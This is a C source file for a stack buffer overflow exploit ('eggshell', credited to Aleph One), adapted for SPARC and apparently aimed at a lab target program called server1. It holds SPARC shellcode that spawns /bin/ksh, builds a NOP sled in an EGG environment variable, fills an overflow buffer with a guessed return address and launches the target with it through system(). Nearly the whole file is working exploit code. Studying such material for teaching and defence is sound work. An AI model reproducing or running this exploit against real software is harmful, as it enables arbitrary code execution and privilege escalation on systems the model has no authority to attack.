/*
 * eggshell v1.0
 *
 * Aleph One / aleph1@underground.org
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define NOP_SIZE    4
char nop_[]="\xac\x15\xa1\x6e";
//char shellcode[] = "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e" "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0" "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08" "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
//char shellcode[] = "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e" "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0" "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff" "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
char shellcode[]=         /* 10*4+8 bytes */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x7f\xff\xff\xff"   /* call  */ "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */ "\x92\x02\x20\x10"   /* add %o0,16,%o1 */ "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */ "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */ "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */ "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */ "\x91\xd0\x20\x08"   /* ta 8 */ "/bin/ksh" ;

unsigned long get_sp(void) {
  __asm__("or %sp, %sp, %i0");
}

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048

void usage(void);

void main(int argc, char *argv[]) {
  char *ptr, *bof, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;

  while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
    switch (c) {
      case 'a':
        align = atoi(optarg);
        break;
      case 'b':
        bsize = atoi(optarg);
        break;
      case 'e':
        eggsize = atoi(optarg);
        break;
      case 'o':
        offset = atoi(optarg);
        break;
      case '?':
        usage();
        exit(0);
    }

  if (strlen(shellcode) > eggsize) {
    printf("Shellcode is larger the the egg.\n");
    exit(0);
  }

  if (!(bof = malloc(bsize+1))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize+1))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
    bsize, eggsize, align);
  printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);

  addr_ptr = (long *) bof;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;
  // second to last word should be the frame pointer
  *(addr_ptr-2) = get_sp() + 96;

  ptr = egg;
  for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
    for (n = 0; n < NOP_SIZE; n++) {
      m = (n + align) % NOP_SIZE;
      *(ptr++) = nop_[m];
    }

  ptr -= align;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  bof[bsize] = '\0';
  egg[eggsize] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);

  //memcpy(bof,"BOF=",4);
  //putenv(bof);
  char* cmd = calloc(bsize+10, 1);
  char* cmdp = cmd + 10;
  strcpy(cmd, "./server1 ");
  for (int k = 0; k < bsize+1; ++k)
    *(cmdp++) = bof[k];
  system(cmd);
}

void usage(void) {
  (void)fprintf(stderr,
    "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\n");
}
